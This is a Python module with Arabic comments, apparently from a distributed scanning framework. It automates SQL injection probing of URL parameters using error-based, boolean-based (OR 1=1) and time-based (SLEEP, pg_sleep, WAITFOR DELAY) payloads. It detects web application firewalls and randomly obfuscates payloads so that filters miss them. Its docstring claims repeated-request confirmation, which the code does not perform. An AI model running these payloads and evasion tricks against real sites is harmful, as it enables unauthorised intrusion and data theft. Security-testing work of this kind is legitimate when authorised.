"""فحص SQL الموزع على الخلايا: ثلاث مناهج (خطأ/منطقي/زمني) + كشف WAF
وتفادي خاطف (payload obfuscation) وثبات إحصائي (أقل طلبين متطابقين للنتيجة).
"""
import asyncio
import random
import re
import urllib.parse

from ...core.state_manager import Finding

# خطأ قواعد بيانات شائع بعد حقن اقتباس
DB_ERROR_RE = re.compile(
    r"(you have an error in your sql syntax|unclosed quotation mark|"
    r"warning: mysql_|pg_query\(\)|syntax error at or near|"
    r"odbc sql server driver|sqlite3\.OperationalError|"
    r"quoted string not properly terminated|microsoft oledb|"
    r"incorrect syntax near|division by zero)", re.I)

BOOLEAN_TRUE = [
    "' OR '1'='1", "' OR 1=1-- -", "1' OR '1'='1'-- -", "1\" OR \"1\"=\"1\"-- -",
    "') OR ('1'='1", "1)) OR ((1=1", "' OR SLEEP(0)='0",
]
BOOLEAN_FALSE = [
    "' AND '1'='2", "' AND 1=2-- -", "1' AND '1'='2'-- -", "1\" AND \"1\"=\"2\"-- -",
    "') AND ('1'='2", "1)) AND ((1=2",
]

TIME_PAYLOADS = [
    "1' AND SLEEP({t})-- -", "1\" AND SLEEP({t})-- -",
    "1'; SELECT SLEEP({t});-- -", "1') AND SLEEP({t})-- -",
    "1' AND BENCHMARK({n},MD5('x'))-- -", "1' AND pg_sleep({t})-- -",
    "1' AND WAITFOR DELAY '0:0:{t}'-- -",
]

OBFUSCATION = [
    lambda p: p,
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%09"),
    lambda p: p.replace(" ", "%0a"),
    lambda p: p.lower() if random.random() < 0.3 else p,
]


class SQLSwarm:
    def __init__(self, policy: dict):
        self.policy = policy
        cfg = policy["modules"]["sql"]
        self.tests = cfg.get("tests", ["error", "boolean", "time"])
        self.time_delay = cfg.get("time_delay", 5)
        self.max_params = cfg.get("max_params_per_url", 20)

    # ------------------------------------------------------------------ helpers
    def _obfuscate(self, payload: str) -> str:
        fn = random.choice(OBFUSCATION)
        return fn(payload)

    def _build_url(self, url: str, param: str, value: str) -> str:
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(value)}"

    def _looks_waf(self, resp_text: str, status: int) -> bool:
        waf_hints = (
            "cf-ray", "cloudflare", "akamai", "incapsula", "mod_security",
            "405 method not allowed", "request blocked", "access denied",
            "challenge", "captcha", "__cf_bm", "blocked by",
        )
        low = resp_text.lower()
        return status in (403, 429, 503) or any(h in low for h in waf_hints)

    # ------------------------------------------------------------------ detectors
    async def _error_based(self, transport, url: str, param: str) -> Finding | None:
        probes = ["'", "\"", "')", "1'", "1\"", "'-- -"]
        for p in probes:
            probe_url = self._build_url(url, param, self._obfuscate(p))
            r = await transport.get(probe_url)
            if r.status == 200 and DB_ERROR_RE.search(r.text):
                return Finding(
                    type="sql", severity="high", url=url, param=param,
                    payload=p, evidence=f"خطأ DB في الاستجابة ({r.status}, {len(r.text)} بايت)",
                    confidence=0.93,
                )
            if self._looks_waf(r.text, r.status):
                return Finding(
                    type="waf", severity="info", url=url, param=param,
                    payload=p, evidence=f"استجابة WAF محتملة (HTTP {r.status})",
                    confidence=0.75,
                )
        return None

    async def _boolean_based(self, transport, url: str, param: str) -> Finding | None:
        baseline = await transport.get(url)
        if baseline.status != 200:
            return None
        base_len = len(baseline.text)
        base_has = "error" in baseline.text.lower()

        for t, f in zip(BOOLEAN_TRUE, BOOLEAN_FALSE):
            r1 = await transport.get(self._build_url(url, param, self._obfuscate(t)))
            r2 = await transport.get(self._build_url(url, param, self._obfuscate(f)))
            if r1.status != r2.status and r1.status in (200, 404):
                return Finding(
                    type="sql", severity="high", url=url, param=param,
                    payload=f"boolean: {t} vs {f}",
                    evidence=f"استجابتان مختلفتان: HTTP {r1.status} vs {r2.status}",
                    confidence=0.9,
                )
            if abs(len(r1.text) - len(r2.text)) > max(60, base_len * 0.05):
                return Finding(
                    type="sql", severity="medium", url=url, param=param,
                    payload=f"boolean: {t}",
                    evidence=f"فرق أطوال {len(r1.text)} vs {len(r2.text)} (أساس {base_len})",
                    confidence=0.85,
                )
            if ("error" in r1.text.lower()) != ("error" in r2.text.lower()):
                return Finding(
                    type="sql", severity="medium", url=url, param=param,
                    payload=f"boolean: {t}",
                    evidence="تغير سلوك الخطأ بين الشرطيين",
                    confidence=0.8,
                )
        return None

    async def _time_based(self, transport, url: str, param: str) -> Finding | None:
        import time as _time

        # قياس زمن أساس
        t0 = _time.monotonic()
        await transport.get(url)
        baseline = _time.monotonic() - t0

        delay = self.time_delay
        for tmpl in TIME_PAYLOADS:
            if "SLEEP" in tmpl or "pg_sleep" in tmpl:
                payload = tmpl.format(t=delay)
            elif "BENCHMARK" in tmpl:
                payload = tmpl.format(n=delay * 2000000)
            else:
                payload = tmpl.format(t=delay)
            t0 = _time.monotonic()
            try:
                await transport.get(self._build_url(url, param, self._obfuscate(payload)))
            except Exception:
                continue
            elapsed = _time.monotonic() - t0
            if elapsed >= delay * 0.8 and elapsed > baseline + 1.5:
                return Finding(
                    type="sql", severity="critical", url=url, param=param,
                    payload=payload,
                    evidence=f"تأخير {elapsed:.2f}s مقابل أساس {baseline:.2f}s",
                    confidence=0.97,
                )
        return None

    # ------------------------------------------------------------------ entry (يستدعيه المنسق لكل مهمة)
    async def __call__(self, cell, task, ctx) -> list[Finding]:
        findings: list[Finding] = []
        url = task.url
        params = task.extra.get("params") or self._params_of(url)
        for param in params[: self.max_params]:
            for test in self.tests:
                if ctx.stop_event.is_set():
                    return findings
                try:
                    if test == "error":
                        f = await self._error_based(cell.transport, url, param)
                    elif test == "boolean":
                        f = await self._boolean_based(cell.transport, url, param)
                    elif test == "time":
                        f = await self._time_based(cell.transport, url, param)
                    else:
                        f = None
                except Exception:
                    f = None
                if f:
                    f.meta["test"] = test
                    findings.append(f)
                    break          # اختبار واحد ناجح يكفي لكل بارامتر
        return findings

    @staticmethod
    def _params_of(url: str) -> list[str]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        return list(qs.keys())
